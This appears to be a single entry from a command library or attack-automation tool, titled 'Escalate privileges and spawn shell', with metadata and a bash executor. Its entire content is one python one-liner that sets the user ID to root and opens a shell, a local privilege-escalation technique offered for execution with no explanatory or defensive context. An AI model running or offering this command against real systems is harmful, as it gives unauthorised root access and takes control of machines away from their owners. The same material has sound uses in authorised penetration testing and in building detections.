---
id: 717043fe-78aa-4759-bba1-ace51f2396e3
name: Escalate privileges and spawn shell
type: command
executor: bash
data: $ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
output: null
created_at: '2023-04-06T03:56:18.915411+00:00'
updated_at: '2023-04-10T20:34:20.931371+00:00'
---

# Escalate privileges and spawn shell

```bash
$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
